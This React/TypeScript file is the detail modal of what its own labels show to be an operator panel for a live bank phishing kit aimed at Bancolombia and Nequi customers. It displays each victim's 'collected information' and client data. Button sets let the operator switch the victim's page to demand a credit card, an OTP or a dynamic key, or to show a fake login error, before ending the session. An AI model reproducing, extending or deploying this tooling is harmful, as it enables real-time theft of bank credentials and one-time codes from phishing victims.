import React from 'react';
import { User } from '@supabase/supabase-js';
import { Badge } from '@/components/ui/badge';
import { CircleUserRound, Heart, HeartCrack, Trash2 } from 'lucide-react';
import DrawerComments from './drawer-comments';
import { Button } from '@/components/ui/button';
import { cn, selectColorStatus } from '@/lib/utils';
import { Skeleton } from '@/components/ui/skeleton';
import { createClient } from '@/lib/supabase/client';
import { Separator } from '@/components/ui/separator';
import { WebEngageV1InfoAirports } from '../card-render';
import { CATALOG_BC } from '@/lib/const';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuGroup,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuPortal,
  DropdownMenuSeparator,
  DropdownMenuShortcut,
  DropdownMenuSub,
  DropdownMenuSubContent,
  DropdownMenuSubTrigger,
  DropdownMenuTrigger,
} from '@/components/ui/dropdown-menu';
import { mutate } from 'swr';
import { BANKS_WITH_LOGO } from '@/consts';
type openCardInfo = WebEngageV1InfoAirports | undefined;
interface IProps {
  data: openCardInfo;
  openCard: number | undefined;
  setOpenCard: React.Dispatch<number | undefined>;
  user: User;
}
interface TypeButtonOptions {
  label: string;
  disable?: boolean;
  option: {
    error: boolean;
    step: number;
    label?: string;
  };
}
[];
const ModalDetail = (props: IProps) => {
  const supabase = createClient();
  const handleClose = () => props.setOpenCard(undefined);
  const handleDelete = async () => {
    await supabase
      .from('panel')
      .update({
        deleted: true,
      })
      .eq('id', props.data?.id)
      .then(() => mutate('panel'));
    props.setOpenCard(undefined);
  };
  const handleFavorite = async () => {
    await supabase
      .from('panel')
      .update({
        favorite: !props?.data?.favorite,
      })
      .eq('id', props.data?.id)
      .then(() => mutate('panel'));

    props.setOpenCard(undefined);
  };
  const CURRENT_STEP = CATALOG_BC[props.data?.currentStep?.step ?? 0];
  const user =
    props.data?.processHistory?.at(0)?.data.username ??
    props.data?.processHistory?.at(0)?.data.document ??
    props.data?.processHistory?.at(0)?.data.fullName;
  const updateStep = async (step: number, error: boolean, label: string) => {
    if (CATALOG_BC[step] === 'END') {
      handleClose();
      mutate('panel');
    }

    await supabase
      .from('panel')
      .update({
        currentStep: {
          error,
          step,
          label,
        },
      })
      .eq('id', props.data?.id)
      .select()
      .then((res) => {
        console.log(res);
      });
  };
  const isStateLoading = CURRENT_STEP === 'LOADING';
  const COLOR_SELECTED = selectColorStatus(CURRENT_STEP);
  const lastOriginArePasarela = props?.data?.processHistory
    ?.at(-1)
    ?.label?.includes('TC PASARELA');

  // new logic buttons
  console.log();
  const BANK: string = props?.data?.bank?.toLowerCase() ?? '';
  const _BANK: string = props?.data?.bank ?? '';
  console.log(_BANK);
  const bankHasLogo = !BANKS_WITH_LOGO.includes(_BANK);
  const BUTTONS_MAP_SELECTED = lastOriginArePasarela
    ? bankHasLogo
      ? BUTTONS_MAP_CATALOG['pasarela_check_without_logo']
      : BUTTONS_MAP_CATALOG['pasarela_check_' + BANK] ??
        BUTTONS_MAP_CATALOG['pasarela_check']
    : bankHasLogo
    ? BUTTONS_MAP_CATALOG['bank_without_logo']
    : BUTTONS_MAP_CATALOG[BANK] ?? BUTTONS_MAP_CATALOG['default'];

  const BUTTONS_MAP_CLASSNAME_SELECTED = lastOriginArePasarela
    ? BUTTONS_MAP_CLASSNAME['pasarela_check']
    : BUTTONS_MAP_CLASSNAME[BANK] ?? BUTTONS_MAP_CLASSNAME['default'];

  return (
    <Dialog open={Boolean(props.openCard)} onOpenChange={handleClose}>
      <DialogContent className='max-w-2xl overflow-auto border-none rounded-none h-dvh'>
        {/* <DrawerComments {...props} /> */}

        <section className='space-y-10'>
          <DialogHeader>
            <header>
              <DialogTitle className='grid text-xl font-normal leading-6 place-items-center'>
                <DropdownMenu>
                  <DropdownMenuTrigger asChild>
                    <Button variant='ghost' className='-mt-3'>
                      <section className='flex gap-2'>
                        <CircleUserRound className='size-[24px] text-gray-300' />
                        <p className='leading-[25px]'>{user}</p>
                      </section>
                    </Button>
                  </DropdownMenuTrigger>
                  <DropdownMenuContent className='w-56'>
                    <DropdownMenuGroup>
                      <DropdownMenuItem onClick={handleFavorite}>
                        {props?.data?.favorite ? (
                          <HeartCrack className='w-4 h-4 mr-2' />
                        ) : (
                          <Heart className='w-4 h-4 mr-2' />
                        )}
                        <span>
                          {props?.data?.favorite ? 'Desfavorito' : 'Favorito'}
                        </span>
                        <DropdownMenuShortcut>⇧⌘H</DropdownMenuShortcut>
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={handleDelete}>
                        <Trash2 className='w-4 h-4 mr-2' />
                        <span>Eliminar</span>
                        <DropdownMenuShortcut>⇧⌘E</DropdownMenuShortcut>
                      </DropdownMenuItem>
                    </DropdownMenuGroup>
                  </DropdownMenuContent>
                </DropdownMenu>
              </DialogTitle>
              <Separator className='mt-1 mb-1' />
            </header>

            <div className='flex justify-center gap-3 mb-1'>
              <section className='relative text-[15px] font-medium'>
                {COLOR_SELECTED === 'default' ? (
                  <Skeleton className='px-4 h-10 w-fit py-0.5 grid place-items-center'>
                    {props.data?.currentStep.label}
                  </Skeleton>
                ) : (
                  <>
                    <Badge
                      className='relative z-10 h-10 px-4 text-[15px] font-medium'
                      variant={COLOR_SELECTED}
                    >
                      {props.data?.currentStep.label}
                    </Badge>
                    {CURRENT_STEP === 'LOADING' && (
                      <span className='absolute inset-0 inline-flex w-full h-full duration-500 scale-75 rounded-md bg-destructive animate-ping' />
                    )}
                  </>
                )}
                {isStateLoading && (
                  <span className='absolute inset-0 inline-flex w-full h-full duration-500 scale-75 rounded-md bg-destructive animate-ping' />
                )}
              </section>
            </div>

            <DialogDescription className={cn(BUTTONS_MAP_CLASSNAME_SELECTED)}>
              {BUTTONS_MAP_SELECTED.map((d: any, i: number) => (
                <Button
                  key={d.label}
                  variant={'secondary'}
                  disabled={d.disable || !isStateLoading}
                  onClick={() =>
                    updateStep(d.option.step, d.option.error, d.label)
                  }
                  className={cn(
                    'text-[13px] leading-3 font-normal',
                    bankHasLogo &&
                      BUTTONS_MAP_SELECTED.length - 1 === i &&
                      'col-span-2'
                  )}
                >
                  {d.label}
                </Button>
              ))}
            </DialogDescription>
          </DialogHeader>

          <section className='space-y-5'>
            <section className='space-y-2'>
              <h2 className='mb-0 text-lg font-medium text-center'>
                INFORMACION RECOLECTADA 🌱
              </h2>
              <Separator />

              <ul className='relative grid text-xs text-gray-100 rounded-lg gap-x-8 gap-y-2 bg-section md:text-sm'>
                {props.data &&
                  props.data.processHistory
                    ?.map((d, i) => {
                      return (
                        <li key={i} className='flex flex-col'>
                          <header className='flex justify-between'>
                            <code className='font-medium text-left md:text-base'>
                              {d.label}
                            </code>
                            {/* <code className='text-left '>Enviador: Pablo</code> */}
                          </header>
                          <div className='grid grid-cols-2 mx-4 gap-y-1'>
                            <div className='contents'>
                              {Object.entries(d.data).map(([key, value]) => (
                                <li key={key} className='contents'>
                                  <code className='text-left'>{key}:</code>
                                  <code className='overflow-hidden text-right truncate'>
                                    {String(value)}
                                  </code>
                                </li>
                              ))}
                            </div>
                          </div>
                          <Separator className='mt-2' />
                        </li>
                      );
                    })
                    .reverse()}
              </ul>
            </section>
            <section className='space-y-2'>
              <h2 className='text-lg font-medium text-center'>
                INFORMACION DEL CLIENTE 🙆‍♂️
              </h2>
              <ul className='relative grid grid-cols-2 text-xs text-gray-100 rounded-lg gap-x-8 gap-y-2 bg-section md:text-sm'>
                {props.data &&
                  Object.entries(props.data).map(([key, value]) => (
                    <li key={key} className='contents'>
                      <code className='text-left'>{key}:</code>
                      <code className='overflow-hidden text-right truncate'>
                        {String(value)}
                      </code>
                    </li>
                  ))}
              </ul>
            </section>
          </section>
        </section>
      </DialogContent>
    </Dialog>
  );
};

export default ModalDetail;

const BUTTONS_OPTIONS_BANCOLOMBIA: TypeButtonOptions[] = [
  {
    label: '💳 TC',
    option: {
      error: false,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '📲 OTP',
    option: {
      error: false,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '⏳ DIN',
    option: {
      error: false,
      step: CATALOG_BC.DYNAMIC,
    },
  },

  {
    label: '❌ LG',
    option: {
      error: true,
      step: CATALOG_BC.LOGIN,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '❌ OTP',
    option: {
      error: true,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '❌ DIN',
    option: {
      error: true,
      step: CATALOG_BC.DYNAMIC,
    },
  },
  {
    label: '✅ FIN',
    option: {
      error: false,
      step: CATALOG_BC.END,
    },
  },
];
const BUTTONS_OPTIONS_DEFAULT: TypeButtonOptions[] = [
  {
    label: '💳 TC',
    option: {
      error: false,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '📲 OTP',
    option: {
      error: false,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '❌ LG',
    option: {
      error: true,
      step: CATALOG_BC.LOGIN,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '❌ OTP',
    option: {
      error: true,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '✅ FIN',
    option: {
      error: false,
      step: CATALOG_BC.END,
    },
  },
];
const BUTTONS_OPTIONS_WITHOUT_LOGO: TypeButtonOptions[] = [
  {
    label: '💳 TC',
    option: {
      error: false,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '📲 OTP',
    option: {
      error: false,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '❌ OTP',
    option: {
      error: true,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '✅ FIN',
    option: {
      error: false,
      step: CATALOG_BC.END,
    },
  },
];
const BUTTONS_OPTIONS_PASARELA_CHECK: TypeButtonOptions[] = [
  {
    label: '📲 OTP',
    option: {
      error: false,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '🏦 LOGO',
    option: {
      error: false,
      step: CATALOG_BC.LOGIN,
    },
  },
];
const BUTTONS_OPTIONS_PASARELA_CHECK_DINAMICA: TypeButtonOptions[] = [
  {
    label: '⏳ DIN',
    option: {
      error: false,
      step: CATALOG_BC.DYNAMIC,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '🏦 LOGO',
    option: {
      error: false,
      step: CATALOG_BC.LOGIN,
    },
  },
];
const BUTTONS_OPTIONS_PASARELA_WITHOUT_LOGO: TypeButtonOptions[] = [
  {
    label: '⏳ OTP',
    option: {
      error: false,
      step: CATALOG_BC.OTP,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_BC.TC,
    },
  },
  {
    label: '✅ FIN',
    option: {
      error: false,
      step: CATALOG_BC.END,
    },
  },
];

const BUTTONS_MAP_CATALOG: Record<string, any> = {
  bancolombia: BUTTONS_OPTIONS_BANCOLOMBIA,
  nequi: BUTTONS_OPTIONS_BANCOLOMBIA,
  default: BUTTONS_OPTIONS_DEFAULT,
  bank_without_logo: BUTTONS_OPTIONS_WITHOUT_LOGO,
  pasarela_check: BUTTONS_OPTIONS_PASARELA_CHECK,
  pasarela_check_bancolombia: BUTTONS_OPTIONS_PASARELA_CHECK_DINAMICA,
  pasarela_check_nequi: BUTTONS_OPTIONS_PASARELA_CHECK_DINAMICA,
  pasarela_check_without_logo: BUTTONS_OPTIONS_PASARELA_WITHOUT_LOGO,
};
const BUTTONS_MAP_CLASSNAME: Record<string, string> = {
  bancolombia: 'grid grid-cols-4 gap-1',
  nequi: 'grid grid-cols-4 gap-1',
  default: 'grid grid-cols-3 gap-1',
  pasarela_check: 'grid grid-cols-3 gap-1',
};
